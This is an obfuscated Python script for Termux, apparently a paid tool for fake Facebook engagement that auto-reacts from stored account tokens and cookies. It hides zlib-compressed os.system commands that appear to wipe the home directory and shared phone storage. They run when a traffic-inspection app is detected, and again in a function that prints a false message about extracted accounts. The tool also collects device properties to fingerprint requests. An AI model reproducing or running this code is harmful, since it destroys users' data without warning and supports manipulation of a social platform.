import requests
import json
import time
import os
import shutil
import re
import datetime
import random
import os
import time
import logging
import requests
from rich.console import Console
from rich.panel import Panel
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import ascii_lowercase, ascii_uppercase, digits
import shutil
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
import mechanize
import concurrent.futures
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,getpass,mechanize,requests
import os,base64,zlib,pip,urllib,urllib3, sys, re, requests, time, random, json, string
import os,requests,json,time,re,random,sys,uuid,string,subprocess
import requests
import os, platform, time, sys
import re
import uuid
import random
import os
import time
import threading
import json
import base64
import platform
import logging
import threading,base64
import os,time,re,json,random
import datetime
import requests,random,uuid,string,hashlib,json
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import os,base64,zlib,pip,urllib
import requests
import re, bs4, requests, sys, os, random, json, time, datetime
import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
import requests
import random
import threading
import json
import base64
import platform
import logging
import shutil
import requests
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
import os
import re
import sys
import time
import json
import random
import datetime
import requests
import sys
import os
import requests
import threading
import time
import os
import requests
import re
import platform
import sys
import random
import subprocess
import threading
import itertools
import base64
import uuid
import zlib
import re
import json
import uuid
import subprocess
import shutil
import webbrowser
import time
import json
import sys
import random
import datetime
import time
import re
import subprocess
import platform
import string
import json
import time
import re
import random
import sys
import string
import uuid
import requests
import os,base64,zlib,pip,urllib,urllib3
import platform,math,smtplib
import platform
import smtplib
import math
import mahdix
import os,base64,zlib,pip,urllib
from os import path
from os import system as sm
from time import sleep as sp
from sys import platform as pf
from rich import print as rich_print
from colorama import Fore, Style, init
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.request import urlopen
from os import system as osRUB
from os import system as cmd
from time import sleep,strftime
from time import sleep
from requests import api
from urllib3 import connection
from urllib import request
from requests import sessions
from requests import models
from requests import utils
from requests import adapters
from requests import cookies
from requests import compat
from requests import hooks
from requests import exceptions
from requests import certs
from requests import structures
from requests import auth
from requests import packages
from urllib.request import parse_http_list
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as bsp
from bs4 import BeautifulSoup as bsp
from string import *
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress
from time import sleep as sp
from time import localtime as lt
from urllib.request import urlopen
from atexit import register
from time import sleep
from time import sleep,strftime
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import *
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress
from concurrent.futures import ThreadPoolExecutor, as_completed
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup
from time import strftime
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor as loda
from bs4 import BeautifulSoup
from time import strftime
from os import path
from urllib.request import urlopen
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
from urllib.error import URLError
from concurrent.futures import ThreadPoolExecutor as threadspeed
from requests.exceptions import ConnectionError
from time import sleep
first="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/"
sec=requests.Session()
ses=requests.Session()

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
LI_YELLOW = '\033[93m'
LI_GREEN = '\033[92m'
NOTE = '\x1b[38;5;203m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\x1b[38;5;46m'
YELLOW = '\033[1;33m'
c = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK ="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
CYAN ='\033[1;96m'
red = '\x1b[1;31m'
yellow = '\x1b[1;33m'
blue = '\x1b[1;34m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
black = '\x1b[1;30m'
c = '\x1b[1;35m'
grey = '\x1b[1;90m'
orange = '\x1b[1;91m'
lime = '\x1b[1;92m'
sky_blue = '\x1b[1;94m'
purple = '\x1b[1;95m'
turquoise = '\x1b[1;96m'
c = '\033[1;96m'
w = '\033[1;97m'
wh = '\033[1;97m'
reset = '\033[0m'
r = '\033[0m'
RESET = "\033[0m"

COLORS = {
    'bold_red': "\033[1;31m",
    'bold_GREEN': "\033[1;32m",
    'bold_yellow': "\033[1;33m",
    'bold_cyan': "\033[1;36m",
    'reset': "\033[0m"
}

from requests import api
x = open(api.__file__, 'r').read()

try:
        a = "anar"
        t="tt"
        fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
        if f'com.h{t}pc{a}y.pro' in fileee:
                print(f'{red}FIRST UNINSTALL HTTPCANARY APK FOR RUN TOOLS')
                os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
                os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
                exit()
        else:pass
except Exception as e:
                pass

def check_install_requests():
    try:
        import requests
    except ModuleNotFoundError:
        os.system('pip uninstall requests chardet urllib3 idna certifi -y; pip install chardet urllib3 idna certifi requests')

check_install_requests()
try:
    os.system('clear')
    print(f'{c}CHECKING UPDATE...')
    sleep(1)
    os.system("git pull > /dev/null 2>&1")
except:
    pass

def clear_line():
    sys.stdout.write('\x1b[F\x1b[K')

ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])

def W_ueragnt():
    chrome_version = random.randint(80, 99)
    webkit_version = random.randint(500, 599)
    safari_version = random.randint(400, 499)
    windyows_version = random.randint(8, 10)
    is_win64 = random.choice([True,False])
    if is_win64:
        if not 'WOW64;':
            user_agent = f'''Mozilla/5.0 (Windows NT {windows_version}.{''}Win64; x64) AppleWebKit/{webkit_version}.0 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/{safari_version}.0'''
            return user_agent

headers = {
    'user-agent': W_ueragnt(),
    'viewport-width': '847',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'GroupCometJoinForumMutation',
    'x-fb-lsd': 'wGh6ACr3OJ2v2rPBdXy-1o'}
headersccc = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'viewport-width': '546',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'CometProfilePlusLikeMutation',
    'x-fb-lsd': 'KA9qtqSd7hV8150DnYqqmy'}

hedars_golba = {
'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7','cache-control': 'max-age=0','dpr': '1','sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.117", "Google Chrome";v="118.0.5993.117", "Not=A?Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':W_ueragnt(),'viewport-width': '455',}

hedars_grapql={ 'authority': 'www.facebook.com',
'accept': '*/*','accept-language': 'en-US,en;q=0.9,id;q=0.8,bn;q=0.7','content-type': 'application/x-www-form-urlencoded','dpr': '1','origin': 'https://www.facebook.com','referer': 'https://www.facebook.com/groups/1944912799181203/permalink/2045697582436057/?mibextid=oMANbw','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.117", "Google Chrome";v="118.0.5993.117", "Not=A?Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin','user-agent': W_ueragnt(),'viewport-width': '752','x-asbd-id': '129477','x-fb-friendly-name': 'useGroupRemovePostAsAdminMutation','x-fb-lsd': 'RiDxK9cbLXTaMyAzkOl9Gx',}

import os 

folder_name = "/sdcard/BOOSTING"
file_names = ["toka.txt", "tokaid.txt", "cok.txt", "cokid.txt", "tokp", "tokpid"]

if not os.path.exists(folder_name):
    try:
        os.makedirs(folder_name)
        print(f"Folder '{folder_name}' created.")
    except Exception as e:
        print(f"Failed to create folder '{folder_name}': {e}")
else:
    print(f"Folder '{folder_name}' already exists.")

for file_name in file_names:
    file_path = os.path.join(folder_name, file_name)
    if not os.path.exists(file_path):
        try:
            with open(file_path, 'w') as file:
                pass
            print(f"File '{file_path}' created.")
        except Exception as e:
            print(f"Failed to create file '{file_path}': {e}")
    else:
        print(f"File '{file_path}' already exists.")

def count_lines(file_path):
    try:
        with open(file_path, 'r') as file:
            return sum(1 for line in file)
    except FileNotFoundError:
        return 0


import re
import requests

def linktradio(post_link):   
    def extract_postid_from_link(post_link):
        pattern = r'https://www\.facebook\.com/\d+/posts/(\d+)/?'
        match = re.match(pattern, post_link)
        if match:
            return match.group(1)
        return None

    def convert_to_traodoisub(url):
        try:
            response = requests.post('https://id.traodoisub.com/api.php', data={'link': url})
            if response.status_code == 200:
                result = response.json().get('id')
                return result
            return None
        except Exception as e:
            print(f'An error occurred: {e}')
            return None

    if re.match(r'https://www\.facebook\.com/\d+/posts/(\d+)/?', post_link):
        post_id = extract_postid_from_link(post_link)
        if post_id:
            return post_id

    elif 'pfbid' in post_link:
        post_id = convert_to_traodoisub(post_link)
        if post_id:
            return post_id

    elif re.match(r'https://www\.facebook\.com/.+/videos/(\d+)', post_link):
        video_id = extract_postid_from_link(post_link)
        if video_id:
            return f"Video ID: {video_id}"

    elif re.match(r'https://www\.facebook\.com/.+/photo/(\d+)', post_link):
        photo_id = extract_postid_from_link(post_link)
        if photo_id:
            return f"Photo ID: {photo_id}"

    elif re.match(r'https://www\.facebook\.com/share/r/.+', post_link):
        return f"Share Link: {post_link}"

    return 'INVALID LINK FORMAT OR UNABLE TO PROCESS THE LINK.'




sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'SMART'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "SMART"
                        sim_id+=fbcr
        else:
                fbcr = 'SMART'
                sim_id+=fbcr
except:
        fbcr = "SMART"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TNT'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "TNT"
                        sim_id+=fbcr
        else:
                fbcr = 'TNT'
                sim_id+=fbcr
except:
        fbcr = "TNT"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'GLOBE'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "GLOBE"
                        sim_id+=fbcr
        else:
                fbcr = 'GLOBE'
                sim_id+=fbcr
except:
        fbcr = "GLOBE"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TM'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "TM"
                        sim_id+=fbcr
        else:
                fbcr = 'TM'
                sim_id+=fbcr
except:
        fbcr = "TM"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def logo():
    os.system('clear')
    print(f"""

{red}                                
                      
                        _____ _____  ____  
                       / ____|  __ \|  _ \ 
                      | (___ | |__) | |_) |
                       \___ \|  ___/|  _ < 
                       ____) | |    | |_) |
                      |_____/|_|    |____/ 
{red}┗┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳┛
 ┃              Welcome to SpectreBoosting Tools              ┃
{red}┏┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┓
{red}┃{white}AUTHOR : ARTIFICIAL JOHN                                      {red}┃
{red}┃{white}ADMIN : SHANK                                                 {red}┃
{red}┃{white}TYPES : BOOSTING TOOLS                                        {red}┃
{red}┃{white}TOOLS : {GREEN}Paid/Premium                                          {red}┃
{red}┃{white}VERSION :  1.6                                                {red}┃
{red}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""")
logo()
def overview():
    total_accounts = count_lines("/sdcard/BOOSTING/toka.txt")
    total_pages = count_lines("/sdcard/BOOSTING/tokp.txt")
    print(f'{c}┏━━━━━━━━━━━━━━━━━━━━━━━≻ 𝙾𝚅𝙴𝚁 𝚅𝙸𝙴𝚆 ≺━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    print(f"{c}          {cyan}TOTAL ACCOUNTS{yellow}: {GREEN}{total_accounts}{r}  ┃  {cyan}TOTAL PAGES{yellow}: {GREEN}{total_pages}             {c} {r}")
    print(f'{c}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{wh}')
def linex():
	   print(f'{c}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{wh}')
def clear():
    os.system('clear')
    logo()
def fucked():
	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print('{GREEN}EXTRACTED SO MANY ACCOUNTS.{w}');exit()

def setup_user_data():

    os.makedirs("data", exist_ok=True)


    def create_file_if_not_exists(file_path):
        if not os.path.exists(file_path):
            open(file_path, "w").close()
    create_file_if_not_exists("data/BOOSTING.xml")

    def get_user_input(file_path, prompt_message):
        if os.path.getsize(file_path) > 0:
            with open(file_path, "r") as file_obj:
                return file_obj.readline().strip()
        else:
            user_input = input(prompt_message)
            with open(file_path, "w") as file_obj:
                file_obj.write(user_input)
            return user_input
    os.system('clear')
    logo()
    uname = get_user_input("data/BOOSTING.xml", f"{c}「{r}•{c}」{r}ENTER YOUR NAME : ")

setup_user_data()

def get_user_name():
    with open("data/BOOSTING.xml", "r") as file_obj:
        return file_obj.readline().strip()


user_id = str(os.geteuid())
uuid = f"{user_id}TD{user_id}"
key = f"BOOSTING-{uuid}"

def get_approval_data(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.text

def approval():
    try:
        user_id = str(os.geteuid())
        uuid = f"{user_id}CLOWNSEC"
        key = f"BOOSTING-{uuid}"
        clear()
        print(f"         YOU NEED APPOVAL TO ACCESS THIS TOOLS")
        linex()
        print(f'{c}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
        print(f"{c}┃THIS TOOL IS NOT FOR FREE                                     ┃")
        print(f"┃Your Key : {GREEN}{key}                             {c}┃")
        print(f'{c}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
        time.sleep(0.1)
        urls = [ "https://github.com/DuckingDucking/03212c/blob/main/Admin.txt",
        "https://github.com/DuckingDucking/03212c/blob/main/lifetimeaccess.txt",
        "https://github.com/DuckingDucking/03212c/blob/main/rent.txt"
        ]        
        key_found = False
        for url in urls:
            approval_data = get_approval_data(url) 
            if key in approval_data:
                key_found = True
                break
        if key_found:
            print(f"{GREEN}             YOUR KEY HAS BEEN APPROVED!!!")
            time.sleep(3)
            return key
        else:
            print(f'{c}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
            print(f"{c}┃PLEASE COPY THE KEY FIRST AND SEND TO OWNER                   ┃")
            print(f'{c}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
            time.sleep(0.1)
            input(f'{c}CLICK ENTER TO DIRECT TO THE OWNER ')
            os.system(f'am start https://www.facebook.com/ArtificialJohn') 
            time.sleep(1)
            exit() 
    except requests.RequestException:
        logging.error(f"{WHITE}UNABLE TO FETCH DATA FROM SERVER")
        print(f"{WHITE}UNABLE TO FETCH DATA FROM SERVER")
        time.sleep(2)
        exit()
    except Exception as e:
        logging.error(f"{WHITE}AN UNEXPECTED ERROR OCCURRED: %s", e)
        print(f"{WHITE}AN UNEXPECTED ERROR OCCURRED")
        time.sleep(2)
        exit()
approval()

def sm(command):
    pass

def bypass():
    with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file, \
         open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file2, \
         open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file3:

        data = file.read()
        sess = file2.read()
        approve = file3.read()

    keyword = "print(url)"
    keyword2 = "print(data)"

    if any(kw in data for kw in [keyword, "echo", "pprint", "exec"]):
        sm('clear')
        exit()
    elif any(kw in approve for kw in ["https://pastebin.com/raw/EeBmqqLD", "BOOSTING", "pprint"]):
        print(f"TRY HARD MAG BYPASS")
        print(10 * f"{red}TRYING HARD BYPASSING MY TOOL LOL\n")
        exit()
    elif any(kw in sess for kw in [keyword, "rich", "echo", keyword2, "pprint", "print(headers)", "Console", "{data}", "{url}", "{headers}", "open", ".write"]):
        sm('clear')
        exit()
    else:
        timee = datetime.now()
        limittime = timee.strftime("%m-%d-%y")

        if limittime >= "10-30-24":
            clear()
            sys.exit(f"{red}TIME’S UP BRO")
        else:
            bypass()

def clr():
  overview()
  
def menu():
    clear()
    clr()
    print(f"{c}┏━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━┓{wh}")
    print(f'{c}┃   ┃                 Sec/Minutes process                  ┃   ┃')
    print(f'{c}┃   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   ┃')

    print(f'''{c}┃{YELLOW}「01」{GREEN}ADD ACCOUNT              {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「02」{white}AUTO REACT W/O CARE      {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「03」{white}AUTO REACT DP & COVER    {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
